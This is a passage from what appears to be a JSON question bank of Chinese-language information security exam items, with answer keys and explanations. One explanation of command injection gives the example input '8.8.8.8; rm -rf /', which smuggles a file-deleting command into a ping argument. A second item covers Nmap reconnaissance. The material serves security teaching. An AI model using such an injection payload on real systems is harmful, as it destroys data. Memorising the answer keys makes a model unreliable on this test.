HTTPS，傳統防火牆根本防不住 • (C 選項錯誤)攻擊者輸入：8.8.8.8; rm -rf /可能造成：執行 ping+執行刪除指令 • 「只要過濾特殊字元即可」是不可靠的。攻擊者可能利用：編碼繞過、不同語法、Shell 特殊技巧","group_context":null},{"id":"資安題庫B.pdf::64-3-b177c6512d5fcc06","bank":"B","pdf":"資安題庫B.pdf","qid":"64-3-b177c6512d5fcc06","page":64,"number":3,"multiple":false,"answers":["A"],"chosen_last":["D"],"stem":"某 MIS 人員欲對公司一重要伺服器（功能包含檔案伺服器、資料庫功能）使用 Nmap 來執行進行滲透測試，以便瞭解該資訊設備之漏洞是否全數修補完成，請問該 MIS 使用此工具最主要之目的為下列何者？","options":{"A":"利用該伺服器已知對外開放之服務埠進行情蒐","B":"利用該伺服器已知之漏洞提升權限","C":"利用該伺服器已知之漏洞竊取檔案","D":"利用
